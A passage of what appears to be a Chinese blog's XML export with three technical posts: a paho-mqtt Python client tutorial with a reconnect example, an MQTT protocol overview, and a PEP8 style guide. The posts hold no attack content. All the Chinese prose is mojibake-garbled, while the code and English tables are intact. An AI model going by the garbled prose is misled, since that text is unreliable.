Èò≤Ê≠¢ÈìæÊé•ÈáçÁΩÆÊó∂ÔºåÊºèÊéâÂ§ÑÁêÜÈÄª Âú®on_messageÁöÑÂõûË∞ÉÈáåÈù¢ Â§ÑÁêÜÊâÄÊúâÁöÑËÆ¢ÈòÖÊ∂àÊÅØ Êñ≠ÂºÄËøûÊé•Êó∂Â∞ΩÈáè‰ªéÊñ∞ËøûÊé•, ÈÅøÂÖçmqttÁ¶ªÁ∫øÂêé, ÈáçÊñ∞‰∏äÁ∫ø, ÈÄ†ÊàêÊúçÂä°ËøûÊé•ÂºÇÂ∏∏„ÄÇ(Ê≥®ÊÑèloopÁöÑËøîÂõû, ‰øùËØÅloopÁΩëÁªú‰∫ã‰ª∂ÊåÅÁª≠Â§ÑÁêÜ‰∏≠) ÁéØÂ¢É‰ªãÁªç‰ªãÁªç‰∏ãÊàëÁöÑÊµãËØïÁéØÂ¢É: Python Version: 3.6 MQTT Server: emqttserver:2.2-rc1 MQTT Client: paho-mqtt: 1.3.0 emqtt serverÂÆâË£ÖÂèÇËÄÉemqtt dockerÂÆâË£Öpython mqttÂÆ¢Êà∑Á´ØÁöÑÂÆâË£ÖËØ∑ÂèÇËÄÉGithubÂú∞ÂùÄ ÂÆ¢Êà∑Á´Ø‰ΩøÁî®‰ªãÁªçpaho-mqttÊúâ‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØÁ±ª, Êàë‰ª¨‰∏ªË¶Å‰ΩøÁî®ËØ•Á±ªÊù•ÂíåmqttserverËøõË°å‰∫§‰∫í, ÈÇ£‰πàÂ¶Ç‰Ωï‰ΩøÁî®Ëøô‰∏™Á±ªÂñÉ: Âª∫Á´ãËøûÊé•: ‰ΩøÁî®connect()/connect_async()Êù•ÈìæÊé•Âà∞broker(mqtt server) Êñ≠ÂºÄËøûÊé•: ‰ΩøÁî®disconnect()ÊñπÊ≥ïÊù•Êñ≠ÂºÄÂíåbroker(mqtt server)‰πãÈó¥ÁöÑÁΩëÁªúËøûÊé•„ÄÇ Â§ÑÁêÜÁΩëÁªú‰∫ã‰ª∂: ËØ∑È¢ëÁπÅË∞ÉÁî®loop()Êù•Áª¥ÊåÅÂíåbroker(mqtt server)‰πãÈó¥ÁöÑÁΩëÁªú‰∫ã‰ª∂„ÄÇÂ¶ÇÊûú‰∏çÊÉ≥Ëá™Â∑±È¢ëÁπÅÁöÑË∞ÉÁî®loopÊù•Áª¥Êä§ÁΩëÁªú‰∫ã‰ª∂, ÂèØ‰ª•‰ΩøÁî®loop_forever()ÊñπÊ≥ïÊù•Â§ÑÁêÜ,ËØ•ÊñπÊ≥ï‰ºöÂ∏Æ‰Ω†Âæ™ÁéØË∞ÉÁî®loop, Âõ†Ê≠§ËØ•ÊñπÊ≥ïÊòØ‰∏Ä‰∏™ÈòªÂ°ûÁöÑÊñπÊ≥ï„ÄÇÂ¶ÇÊûú‰∏çÊÉ≥Âú®Á®ãÂ∫èÈáåÈù¢ÈòªÂ°û,ÂèØ‰ª•‰ΩøÁî®loop_start()ÊñπÊ≥ï,ËØ•ÊñπÊ≥ï‰ºöÂêØÂä®‰∏Ä‰∏™Á∫øÁ®ãÂú®ÂêéÂè∞ÊâßË°åloop_forever„ÄÇ ËÆ¢ÈòÖÊ∂àÊÅØ: ‰ΩøÁî®subscribe()ÊñπÊ≥ïÊù•ËÆ¢ÈòÖtopicÂíåÊé•Êî∂Êï∞ÊçÆ ÂèëÂ∏ÉÊ∂àÊÅØ: ‰ΩøÁî®publish()ÊñπÊ≥ïÊù•ÂèëÂ∏ÉÊ∂àÊÅØ mqttÁöÑÈÄö‰ø°ÊòØÂºÇÊ≠•ÁöÑ, ÈÄöËøáÁΩëÁªú‰∫ã‰ª∂Êù•ËøõË°åÂõûË∞ÉÂ§ÑÁêÜ, Âõ†Ê≠§Êàë‰ª¨Âü∫Êú¨ÈááÁî®ÂõûË∞ÉÊù•ÁºñÁ®ã, ÂõûË∞ÉÂáΩÊï∞ÁöÑÁ≠æÂêçÂ¶Ç‰∏ã, ÊâÄÊúâÁöÑÂõûË∞ÉÂáΩÊï∞ÈÉΩ2‰∏™Âõ∫ÂÆöÂèÇÊï∞: client: ÂõûË∞ÉÊó∂‰º†ÈÄíÊù•ÁöÑÂÆ¢Êà∑Á´ØÂÆû‰æã userdata: userÁöÑ‰ªª‰ΩïÁ±ªÂûãÁöÑÊï∞ÊçÆ, ÂÆû‰æãÂåñclientÊó∂‰º†ÂÖ•, Áî®Êà∑Ëá™Â∑±‰ΩøÁî®„ÄÇ on_connect(client, userdata, flags, rc)ÂΩìbrokerÂìçÂ∫î‰∫ÜÊàë‰ª¨ÈìæÊé•‰πãÂêéË∞ÉÁî®, Ê∂âÂèäÂà∞ÁöÑÂèÇÊï∞: flags: ÊòØ‰∏Ä‰∏™Â≠óÂÖ∏, ÂåÖÂê´brokerËøîÂõûÁöÑÂìçÂ∫îÊ†áÂøóÁé∞Âú®Âè™Êúâ1‰∏≠Ê†áÂøó: session present, ÈÄöËøáflags[‚Äòsession present‚Äô]Ëé∑ÂèñÂà∞ËØ•Ê†áÂøóÈáåÈù¢ÁöÑÂÜÖÂÆπ, ÂΩìclean session‰∏∫0Êó∂(clean_session=False), broker‰ºö‰øùÂ≠òclientÁöÑÁöÑsession‰ø°ÊÅØ, ËØ•‰ø°ÊÅØ‰ºöÂú®clientÈáçÊñ∞‰∏äÁ∫øÊó∂, ÈÄöËøásession presentËøô‰∏™Ê†áÂøó ËøîÂõûÁªôÂÆ¢Êà∑Á´Ø„ÄÇ rc: retrun code, ËøîÂõûÁä∂ÊÄÅÁ†Å RC Status Description 0 successful connected 1 refused incorrect protocol version 2 refused invalid client identifier 3 refused server unavailable 4 refused bad username or password 5 refused not authorised 6-255 refused Currently unused on_disconnect(client, userdata, rc)ÂΩìclientÂíåbrokerÊñ≠ÂºÄËøûÊé•Êó∂Ë∞ÉÁî®. rcË°®Á§∫Êñ≠ÂºÄËøûÊé•ÊòØÁöÑÁä∂ÊÄÅ RC Description 0 MQTT_ERR_SUCCESS, ÂÆ¢Êà∑Á´ØË∞ÉÁî®disconnect()ÊñπÊ≥ïÊñ≠ÂºÄËøûÊé•, Â±û‰∫éÊ≠£Â∏∏Êñ≠ÂºÄ 1 ÁΩëÁªúÁ≠âÂÖ∂‰ªñÂéüÂõ†ÁÖßÊàêÁöÑËøûÊé•Êñ≠ÂºÄ, ÂºÇÂ∏∏Êñ≠ÂºÄ on_message(client, userdata, message)ÂΩìÂÆ¢Êà∑Á´ØËÆ¢ÈòÖÁöÑtopic‰∏äÊúâÊï∞ÊçÆ Ë¢´Êé•Êî∂Êó∂Ë∞ÉÁî®, messageÊòØ‰∏Ä‰∏™MQTTMessageÁöÑÁ±ª, ËØ•Á±ªÂåÖÂê´‰∫ÜmessageÁöÑÊâÄÊúâÊï∞ÊçÆ: topic: Êï∞ÊçÆÊâÄÂú®ÁöÑtopic payload: messageÁöÑÊï∞ÊçÆÈÉ®ÂàÜ qos: ËØ•Ê∂àÊÅØÁöÑË¥®Èáè: 0, 1, 2 retain: ËØ•Ê∂àÊÅØÊòØÂê¶ÊòØ‰øùÁïôÊ∂àÊÅØ, Â¶ÇÊûú‰∏∫True Ëøô‰∏∫‰øùÁïôÊ∂àÊÅØ, Â¶ÇÊûú‰∏∫FalseÂ∞±ÊòØÊúÄÊñ∞ÁöÑÊ∂àÊÅØ„ÄÇ mid: message id on_publish(client, userdata, mid)ÂΩì‰ΩøÁî®publishÊñπÊ≥ïÂ∞Ümessage‰º†ËæìÂà∞brokerÂêéË∞ÉÁî®, ‰ΩÜÊòØËøôË¶ÅÈíàÂØπ‰∏çÂêåÁöÑqos, ÂØπ‰∫éqos1Âíå2ËÄåË®Ä, ËøôË°®Á§∫Ê∂àÊÅØÂ∑≤ÁªèÂà∞ËææÂêéÁöÑÂõûË∞É, Â¶ÇÊûúqosÊòØ0ÈÇ£‰πà‰ªÖ‰ªÖË°®Á§∫Ê∂àÊÅØÁ¶ªÂºÄ‰∫ÜÂÆ¢Êà∑Á´Ø‰πãÂêéÁöÑÂõûË∞É„ÄÇËøô‰∏™ÂõûË∞ÉÂæàÈáçË¶ÅÔºåÂõ†‰∏∫Âç≥‰Ωøpublish()Ë∞ÉÁî®ËøîÂõûÊàêÂäüÔºåÂπ∂‰∏çÊÄªÊòØÊÑèÂë≥ÁùÄÂ∑≤ÁªèÂèëÈÄÅ‰∫ÜÊ∂àÊÅØ mid: Ë°®Á§∫Â∑≤ÁªèpublishÂá∫ÂéªÁöÑÊ∂àÊÅØÁöÑmessage id on_subscribe(client, userdata, mid, granted_qos)ÂΩìbrokerÂìçÂ∫î‰∫ÜsubscribeËØ∑Ê±Ç‰πãÂêéË∞ÉÁî®„ÄÇ mid: Ë¢´ËÆ¢ÈòÖÊ∂àÊÅØÁöÑmessage id granted_qos: broker‰∏∫‰∏çÂêåÁöÑËÆ¢ÈòÖËØ∑Ê±ÇÊéàÊùÉÁöÑqosÁ∫ßÂà´„ÄÇÊòØ‰∏Ä‰∏™ÂàóË°®„ÄÇ on_unsubscribe(client, userdata, mid)ÂΩìbrokerÂìçÂ∫î‰∫ÜÂèñÊ∂àËÆ¢ÈòÖÁöÑËØ∑Ê±ÇËøáÂêéË∞ÉÁî®„ÄÇ mid: ÂèñÊ∂àËÆ¢ÈòÖÁöÑÊ∂àÊÅØÁöÑmessage id on_log(client, userdata, level, buf)MQTTÈÄö‰ø°ËøáÁ®ã‰∏≠ÁöÑ‰∏Ä‰∫õDebug‰ø°ÊÅØ level: Êó•ÂøóÁ∫ßÂà´MQTT_LOG_INFO, MQTT_LOG_NOTICE, MQTT_LOG_WARNING, MQTT_LOG_ERR, and MQTT_LOG_DEBUG buf: message buffer, debug‰ø°ÊÅØÊú¨Ë∫´„ÄÇ Á§∫‰æã‰ª£Á†ÅÊàëGithub‰∏äÊúâ: ÂÆåÊï¥Á§∫‰æã‰ª£Á†Å123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#!/usr/bin/env python3# -*- coding: utf8 -*-import threadingimport loggingimport timefrom paho.mqtt.client import ClientFORMAT = '%(asctime)s - %(name)s - %(levelname)s - %(message)s'logging.basicConfig(format=FORMAT, level=logging.INFO)logger = logging.getLogger()def pub_topic_test01(client): while True: client.publish(topic="test01", qos=2, payload="test01 topic data") time.sleep(2)def pub_topic_test02(client): while True: client.publish(topic="test02", qos=2, payload="test02 topic data") time.sleep(2)class MyMQTTClass(Client): """ mqtt client for deal data """ def __init__(self): super(MyMQTTClass, self).__init__(client_id="test client", clean_session=False) def on_connect(self, client, obj, flags, rc): logger.info("on connect, rc: %s" % rc) # ÈìæÊé•ËøáÂêéÂÖàÂ§ÑÁêÜsub client.subscribe(topic="test01", qos=2) client.subscribe(topic="test02", qos=2) logger.info("start topic service1...") t1 = threading.Thread(target=pub_topic_test01, args=(client,)) t1.start() self.worker1 = t1 logger.info("start topic service2...") t2 = threading.Thread(target=pub_topic_test02, args=(client,)) t2.start() self.worker2 = t2 def on_message(self, client, obj, msg): logger.debug("on message, topic: %s, qos: %s, data: %s" % (msg.topic, msg.qos, msg.payload)) if msg.topic == "test01": logger.info("deal test01, data: %s" % msg.payload) elif msg.topic == "test02": logger.info("deal test02, data: %s" % msg.payload) else: logger.info("other topic %s, data: %s" %(msg.topic, msg.payload)) def on_publish(self, client, obj, mid): logger.debug("publish -&gt; ,mid: %s" % mid) def on_subscribe(self, client, obj, mid, granted_qos): logger.debug("subscribed &lt;- ,mid: %s, qos: %s" %(mid, granted_qos)) def on_log(self, mqttc, obj, level, string): logger.debug("mqtt debug: %s" % string) def on_disconnect(self, client, userdata, rc): logger.info("disconnect: %s" % rc) while rc == 1: try: client.reconnect() logger.info("reconnect success") rc = 0 except Exception as e: logger.error("reconnect error, %s retry after 3s" % e) time.sleep(3) def run(self): self.connect("172.16.112.251", 1883, 60) while True: rc = self.loop() if rc != 0: time.sleep(1) rc = self.loop() logger.info("recovery from error loop, %s" % rc)def main(): client = MyMQTTClass() client.run()if __name__ == "__main__": main()]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>mqtt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Áâ©ËÅîÁΩë‰πãMQTT]]></title>
    <url>%2F2017%2F07%2F02%2Fmqtt-introduce%2F</url>
    <content type="text"><![CDATA[Áâ©ËÅîÁΩëÁâ©Êé•ÂÖ•ÂçèËÆÆMQTT Áõ∏ÂØπÊù•ËØ¥ÔºåIoTÁöÑÊäÄÊúØÊåëÊàòÔºå‰∏ªË¶ÅÂú®ÂÆâÂÖ®ÈöêÊÇ£„ÄÅËøûÊé•ÁÆ°ÁêÜ„ÄÅÊµ∑ÈáèÊï∞ÊçÆÁÆ°ÁêÜÔºåÁî®ÂÖ≥ÈîÆÂ≠óÊù•ËØ¥Â∞±ÊòØÊµ∑Èáè„ÄÅÈÄöÁî®„ÄÅÂèØÊâ©Â±ï„ÄÅÁÆÄÂçï„ÄÇÁâ©Êé•ÂÖ•‰∫ëÁ´ØÔºåÊúâÂæàÂ§öÊåëÊàò, Êï∞ÊçÆÁöÑÂÆâÂÖ®Â∞§‰∏∫ÈáçË¶Å ÂçèËÆÆÊØîËæÉÂçèËÆÆÊØîËæÉ MQTTÁÆÄ‰ªãMQTTÊòØ‰∏Ä‰∏™ÂÆ¢Êà∑Á´ØÊúçÂä°Á´ØÊû∂ÊûÑÁöÑÂèëÂ∏É/ËÆ¢ÈòÖÊ®°ÂºèÁöÑÊ∂àÊÅØ‰º†ËæìÂçèËÆÆ„ÄÇÂÆÉÁöÑËÆæËÆ°ÊÄùÊÉ≥ÊòØËΩªÂ∑ß„ÄÅÂºÄÊîæ„ÄÅÁÆÄÂçï„ÄÅËßÑËåÉÔºåÊòì‰∫éÂÆûÁé∞„ÄÇËøô‰∫õÁâπÁÇπ‰ΩøÂæóÂÆÉÂØπÂæàÂ§öÂú∫ÊôØÊù•ËØ¥ÈÉΩÊòØÂæàÂ•ΩÁöÑÈÄâÊã©ÔºåÁâπÂà´ÊòØÂØπ‰∫éÂèóÈôêÁöÑÁéØÂ¢ÉÂ¶ÇÊú∫Âô®‰∏éÊú∫Âô®ÁöÑÈÄö‰ø°(M2M)‰ª•ÂèäÁâ©ËÅîÁΩëÁéØÂ¢É(IoT)„ÄÇÊÄª‰ΩìÊù•ËØ¥MQTTÊúâÂ¶Ç‰∏ãÁâπÊÄß: ËΩªÈáèÁ∫ßÁöÑ machine-to-machine ÈÄö‰ø°ÂçèËÆÆ„ÄÇ publish/subscribeÊ®°Âºè„ÄÇ Âü∫‰∫éTCP/IP„ÄÇ ÊîØÊåÅQoS„ÄÇ ÈÄÇÂêà‰∫é‰ΩéÂ∏¶ÂÆΩ„ÄÅ‰∏çÂèØÈù†ËøûÊé•„ÄÅÂµåÂÖ•ÂºèËÆæÂ§á„ÄÅCPUÂÜÖÂ≠òËµÑÊ∫êÁ¥ßÂº†„ÄÇ ÊòØ‰∏ÄÁßçÊØîËæÉ‰∏çÈîôÁöÑAndroidÊ∂àÊÅØÊé®ÈÄÅÊñπÊ°à„ÄÇ FacebookMessengerÈááÁî®‰∫ÜMQTT„ÄÇ MQTTÊúâÂèØËÉΩÊàê‰∏∫Áâ©ËÅîÁΩëÁöÑÈáçË¶ÅÂçèËÆÆ mqttÂçèËÆÆÁÆÄ‰ªã ÂçèËÆÆÁÆÄ‰ªã Êä•ÊñáÊ†ºÂºèbit76543210byte 1Message typeDUPQoS levelRETAINbyte 2Message length (between one and four bytes)byte 3‚Ä¶ if needed to encode message lengthbyte 4‚Ä¶ if needed to encode message lengthbyte 5‚Ä¶ if needed to encode message length ÊéßÂà∂Êåá‰ª§ Message Type Value Description CONNECT 1 Client request to connect to Server CONNACK 2 Connect Acknowledgment PUBLISH 3 Publish message PUBACK 4 Publish Acknowledgment PUBREC 5 Publish Received (assured delivery part 1) PUBREL 6 Publish Release (assured delivery part 2) PUBCOMP 7 Publish Complete (assured delivery part 3) SUBSCRIBE 8 Client Subscribe request SUBACK 9 Subscribe Acknowledgment UNSUBSCRIBE 10 Client Unsubscribe request UNSUBACK 11 Unsubscribe Acknowledgment PINGREQ 12 PING Request PINGRESP 13 PING Response DISCONNECT 14 Client is Disconnecting Qos mqttÁöÑÁä∂ÊÄÅÊú∫wo]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>iot</tag>
        <tag>mqtt</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PythonÁºñÁ†ÅÈ£éÊ†º]]></title>
    <url>%2F2017%2F06%2F24%2Fpython-style-pep8%2F</url>
    <content type="text"><![CDATA[ÊúÄËøëÂÅöÈ°πÁõÆ‰∏ÄÁõ¥‰ΩøÁî®Golang, Ë∑ùÁ¶ª‰∏äÊ¨°‰ΩøÁî®PythonÂ∑≤ÁªèÂçäÂπ¥‰πã‰πÖ‰∫Ü, ÂØπ‰∫éGoÊù•ËØ¥ÊúâfmtÂ∏ÆÂøôÊ†ºÂºèÂåñ, Ëß£ÂÜ≥‰∫ÜÁªùÂ§ßÈÉ®ÂàÜÁºñÁ†ÅÈ£éÊ†ºÈóÆÈ¢ò, ËÄåPythonÂàôÈúÄË¶ÅËá™Â∑±Ê≥®ÊÑè,Ê†πÊçÆÂÆòÊñπÊåáÂØºPEP8ÊàñËÄÖ‰∏Ä‰∫õÊúÄ‰Ω≥ÂÆûË∑µÊØîÂ¶ÇGoogle StyleÊù•ÊéßÂà∂È£éÊ†º„ÄÇÊó∂Èó¥‰πÖ‰∫Ü ‰∏Ä‰∫õÁªÜËäÇÈÉ®ÂàÜÂ∞±ÂøòËÆ∞‰∫Ü, ‰∫éÊòØÁøªÈòÖ‰πãÂâçÂÜôÁöÑÂçöÂÆ¢, ÂèóÁõäËâØÂ§ö, ‰∫éÊòØÊâìÁÆóÊää‰πãÂâçÁöÑËøôÂá†ÁØáÂçöÂÆ¢ËøÅÁßªËøáÊù•, È°∫‰æøÊõ¥Êñ∞, Êñπ‰æø‰ª•ÂêéÊü•ÈòÖ„ÄÇ ÂÖ≥‰∫éÊú¨ÊñáÊú¨Êñá‰∏ªË¶ÅÂèÇËÄÉPEP8(PythonÁâàÊú¨Ê†áÂáÜÂ∫ìÁöÑÁºñÁ†ÅÁ∫¶ÂÆö),‰ª•ÂèäGoogle StyleÁºñÁ†ÅÈ£éÊ†º, ‰ΩÜÂç¥‰∏ç‰ºöÂÆåÂÖ®ÊåâÁÖßPEP8ËøõË°åÁøªËØë, Êàë‰∏ç‰ºöË¥¥Âá∫‰∏çÂêàËßÑËåÉÁöÑ‰ª£Á†Å, Â∞ΩÈáèÁÆÄÊ¥ÅÊòìÊáÇ, Êñπ‰æøÂø´ÈÄüÈòÖËØª, Â¶ÇÊûúÊÉ≥ÁúãÂÆåÊï¥ÁâàÊú¨ÁöÑPEP8Áõ∏ÂÖ≥ÊñáÊ°£, ËØ∑ÁßªÊ≠•ÂèÇËÄÉÊñáÊ°£ÈÉ®ÂàÜ„ÄÇ È£éÊ†ºÊåáÂçóÁöÑÁõÆÁöÑÈ£éÊ†ºÊåáÂçóÁöÑÁõÆÁöÑÂú®‰∫éÁªü‰∏ÄÁºñÁ†ÅÈ£éÊ†º,ËÆ©‰ª£Á†ÅÊúâËßÑÂèØÂæ™,ËøôÊ†∑‰∫∫‰ª¨Â∞±ÂèØ‰ª•‰∏ìÊ≥®‰∫é‚Äù‰Ω†Âú®ËØ¥‰ªÄ‰πà‚Äù, ËÄå‰∏çÊòØ‚Äù‰Ω†Âú®ÊÄé‰πàËØ¥‚Äù.‰ªéËÄåÊîπÂñÑPython‰ª£Á†ÅÁöÑÂèØËØªÊÄß,Âç≥PEP 20ÊâÄËØ¥ÁöÑ‚ÄúÂèØËØªÊÄßËÆ°Êï∞‚Äù(Readability counts). È£éÊ†ºÊåáÈíàÂú®‰∫éÁªü‰∏ÄÈ£éÊ†º, PEP8‰ªÖ‰ªÖÊòØÂÆòÊñπÊåáÂØº, Êú¨Âú∞ÁºñÁ†ÅÈ£éÊ†ºÂêåÊ†∑ÈáçË¶Å, Â¶ÇÊûúÊª°Ë∂≥ÂèØËØªÊÄß, ‰ºòÂÖà‰øùÊåÅÊú¨Âú∞È£éÊ†º, ‰ΩøÂæó‰Ω†Êï¥‰ΩìÈ°πÁõÆÁöÑ‰ª£Á†ÅÈ£éÊ†º‰∏ÄËá¥„ÄÇ ‰ª£Á†ÅÂ∏ÉÂ±Ä ÊØèÁ∫ßÁº©ËøõÁî®4‰∏™Á©∫Ê†º(Âº∫ÁÉàÂª∫ËÆÆ‰ΩøÁî®4‰∏™Á©∫Ê†º‰Ωú‰∏∫Áº©Ëøõ), ‰∏çË¶ÅÊ∑∑Áî®Á©∫Ê†ºÂíåTab, Python3‰∏≠‰∏çÂÖÅËÆ∏Ê∑∑Âêà‰ΩøÁî®TabÂíåÁ©∫Ê†ºÁº©Ëøõ 123def get_version(version=None): "Returns a PEP 386-compliant version number from VERSION." version = get_complete_version(version) Êã¨Âè∑‰∏≠‰ΩøÁî®ÂûÇÁõ¥ÈöêÂºèÁº©ËøõÊàñ‰ΩøÁî®ÊÇ¨ÊåÇÁº©ËøõÔºàÂØπÂáÜÂ∑¶Êã¨Âè∑Ôºâ 12foo = long_function_name(var_one, var_two, var_three, var_four) ifËØ≠Âè•Ë∑®Ë°åÊó∂Ôºå‰∏§‰∏™Â≠óÁ¨¶ÂÖ≥ÈîÆÂ≠ó(ÊØîÂ¶Çif)Âä†‰∏ä‰∏Ä‰∏™Á©∫Ê†ºÔºåÂÜçÂä†‰∏äÂ∑¶Êã¨Âè∑ÊûÑÊàê‰∫ÜÂæàÂ•ΩÁöÑÁº©Ëøõ„ÄÇ 1234# Add some extra indentation on the conditional continuation line.if (this_is_one_thing and that_is_another_thing): do_something() Âè≥ËæπÊã¨Âè∑‰πüÂèØ‰ª•Âè¶Ëµ∑‰∏ÄË°åÔºàÂè≥Êã¨Âè∑ÂõûÈÄÄÔºâ 12345678my_list = [ 1, 2, 3, 4, 5, 6,]result = some_function_that_takes_arguments( 'a', 'b', 'c', 'd', 'e', 'f',) ÊúÄÂ§ßË°åÂÆΩÈôêÂà∂ÊâÄÊúâË°åÁöÑÊúÄÂ§ßË°åÂÆΩ‰∏∫79Â≠óÁ¨¶„ÄÇÊñáÊú¨ÈïøÂùóÔºåÊØîÂ¶ÇÊñáÊ°£Â≠óÁ¨¶‰∏≤ÊàñÊ≥®ÈáäÔºåË°åÈïøÂ∫¶Â∫îÈôêÂà∂‰∏∫72‰∏™Â≠óÁ¨¶„ÄÇÁª≠Ë°åÁöÑÈ¶ñÈÄâÊñπÊ≥ïÊòØ‰ΩøÁî®Â∞èÊã¨Âè∑„ÄÅ‰∏≠Êã¨Âè∑ÂíåÂ§ßÊã¨Âè∑ÂèçÊñúÁ∫ø‰ªçÂèØËÉΩÂú®ÈÄÇÂΩìÁöÑÊó∂ÂÄô„ÄÇÂÖ∂Ê¨°ÊòØÂèçÊñúÊù†„ÄÇ123with open('/path/to/some/file/you/want/to/read') as file_1, \ open('/path/to/some/file/being/written', 'w') as file_2: file_2.write(file_1.read()) Á©∫Ë°å Á©∫‰∫åË°å: È°∂Á∫ßÂÆö‰πâ‰πãÈó¥Á©∫‰∏§Ë°å, ÊØîÂ¶ÇÂáΩÊï∞ÊàñËÄÖÁ±ªÂÆö‰πâ. Á©∫‰∏ÄË°å: ÊñπÊ≥ïÂÆö‰πâ, Á±ªÂÆö‰πâ‰∏éÁ¨¨‰∏Ä‰∏™ÊñπÊ≥ï‰πãÈó¥, ÈÉΩÂ∫îËØ•Á©∫‰∏ÄË°å. ÂáΩÊï∞ÊàñÊñπÊ≥ï‰∏≠, Êüê‰∫õÂú∞ÊñπË¶ÅÊòØ‰Ω†ËßâÂæóÂêàÈÄÇ, Â∞±Á©∫‰∏ÄË°å.12345678910111213141516171819202122232425class StreamingHttpResponse(HttpResponseBase): """ A streaming HTTP response class with an iterator as content. This should only be iterated once, when the response is streamed to the client. However, it can be appended to or replaced with a new iterator that wraps the original content (or yields entirely new content). """ streaming = True def __init__(self, streaming_content=(), *args, **kwargs): super(StreamingHttpResponse, self).__init__(*args, **kwargs) # `streaming_content` should be an iterable of bytestrings. # See the `streaming_content` property methods. self.streaming_content = streaming_content @property def content(self): raise AttributeError("This %s instance has no `content` attribute. " "Use `streaming_content` instead." % self.__class__.__name__) @property def streaming_content(self): return map(self.make_bytes, self._iterator) Ê®°ÂùóÂØºÂÖ• ÂØºÂÖ•Âú®ÂçïÁã¨ÊàêË°å, Âêå‰∏Ä‰∏™Ê®°ÂùóÁöÑÂ§ö‰∏™ÂØπË±°Ë¢´ÂØºÂá∫Êó∂‰ΩøÁî®() ÂØºÂÖ•ÂßãÁªàÂú®Êñá‰ª∂ÁöÑÈ°∂ÈÉ®ÔºåÂú®Ê®°ÂùóÊ≥®ÈáäÂíåÊñáÊ°£Â≠óÁ¨¶‰∏≤‰πãÂêéÔºåÂú®Ê®°ÂùóÂÖ®Â±ÄÂèòÈáèÂíåÂ∏∏Èáè‰πãÂâç„ÄÇ Êé®ËçêÁªùÂØπË∑ØÂæÑÂØºÂÖ•ÔºåÂõ†‰∏∫ÂÆÉ‰ª¨ÈÄöÂ∏∏Êõ¥ÂèØËØªÔºåËÄå‰∏îÂæÄÂæÄÊòØË°®Áé∞Êõ¥Â•ΩÁöÑÔºàÊàñËá≥Â∞ëÊèê‰æõÊõ¥Â•ΩÁöÑÈîôËØØÊ∂àÊÅØ„ÄÇ Á¶ÅÊ≠¢‰ΩøÁî®ÈÄöÈÖçÁ¨¶ÂØºÂÖ•„ÄÇ ÂØºÂÖ•È°∫Â∫èÂ¶Ç‰∏ãÔºöÊ†áÂáÜÂ∫ìËøõÂè£,Áõ∏ÂÖ≥ÁöÑÁ¨¨‰∏âÊñπÂ∫ìÔºåÊú¨Âú∞Â∫ì„ÄÇÂêÑÁªÑÁöÑÂØºÂÖ•‰πãÈó¥Ë¶ÅÊúâÁ©∫Ë°å„ÄÇ123456789101112131415161718192021222324252627282930313233# Ê†áÂáÜÂ∫ìimport asyncioimport osimport tracebackfrom functools import partialfrom inspect import isawaitablefrom multiprocessing import Processfrom signal import ( SIGTERM, SIGINT, signal as signal_func, Signals)from socket import ( socket, SOL_SOCKET, SO_REUSEADDR,)from time import time# Á¨¨‰∏âÊñπÂ∫ìfrom httptools import HttpRequestParserfrom httptools.parser.errors import HttpParserErrortry: import uvloop as async_loopexcept ImportError: async_loop = asyncio# Êú¨Âú∞Â∫ìfrom sanic.log import log, netlogfrom sanic.response import HTTPResponsefrom sanic.request import Requestfrom sanic.exceptions import ( RequestTimeout, PayloadTooLarge, InvalidUsage, ServerError) Â≠óÁ¨¶‰∏≤ÂºïÁî®Python‰∏≠ÂçïÂºïÂè∑Â≠óÁ¨¶‰∏≤ÂíåÂèåÂºïÂè∑Â≠óÁ¨¶‰∏≤ÈÉΩÊòØÁõ∏ÂêåÁöÑ„ÄÇÊ≥®ÊÑèÂ∞ΩÈáèÈÅøÂÖçÂú®Â≠óÁ¨¶‰∏≤‰∏≠ÁöÑÂèçÊñúÊù†‰ª•ÊèêÈ´òÂèØËØªÊÄß„ÄÇÊØîÂ¶Ç‰∏ÄÊÆµÂ≠óÁ¨¶‰∏≤ÈáåÈù¢Êó¢ÊúâÂçïÂºïÂè∑ÔºåÂèàÊúâÂèåÂºïÂè∑ÔºåÂ∞±ÁöÑ‰ΩøÁî® Â§öË°åÂ≠óÁ¨¶‰∏≤ÁöÑÊñπÂºèÔºåÈÅøÂÖç‰ΩøÁî® \‚Äù Êàñ\‚Äô1error = """My Class hasn't "test" attribute.""" Ë°®ËææÂºèÂíåËØ≠Âè•‰∏≠ÁöÑÁ©∫Ê†º12345678910111213141516171819202122# Êã¨Âè∑ÈáåËæπÈÅøÂÖçÁ©∫Ê†º spam(ham[1], &#123;eggs: 2&#125;)# ÈÄóÂè∑ÔºåÂÜíÂè∑ÔºåÂàÜÂè∑‰πãÂâçÈÅøÂÖçÁ©∫Ê†ºif x == 4: print x, y; x, y = y, x# Á¥¢ÂºïÊìç‰ΩúÁ¨¶‰∏çÁïôÁ©∫Ê†ºham[1:9:3]# ÂáΩÊï∞Ë∞ÉÁî®ÁöÑÂ∑¶Êã¨Âè∑‰πãÂâç‰∏çËÉΩÊúâÁ©∫Ê†ºspam(1)# ‰∫åÂÖÉÊìç‰ΩúÁ¨¶‰∏§ËæπÁïô‰∏Ä‰∏™Á©∫Ê†º,Ê∂âÂèä =„ÄÅÁ¨¶ÂêàÊìç‰ΩúÁ¨¶ ( += , -=Á≠â)„ÄÅÊØîËæÉ( == , &lt; , &gt; , != , &lt;&gt; , &lt;= , &gt;= , in , not in , is , is not )„ÄÅÂ∏ÉÂ∞î( and , or , not )x = 1# Êêû‰ºòÂÖàÁ∫ßËøêÁÆóÁ¨¶ÂâçÂêé‰∏çÁïôÁ©∫Ê†ºhypot2 = x*x + y*yc = (a+b) * (a-b)# ÂÖ≥ÈîÆÂ≠óÂèÇÊï∞ÂíåÈªòËÆ§ÂÄºÂèÇÊï∞ÁöÑÂâçÂêé‰∏çË¶ÅÂä†Á©∫Ê†ºdef complex(real, imag=0.0): return magic(r=real, i=imag)# 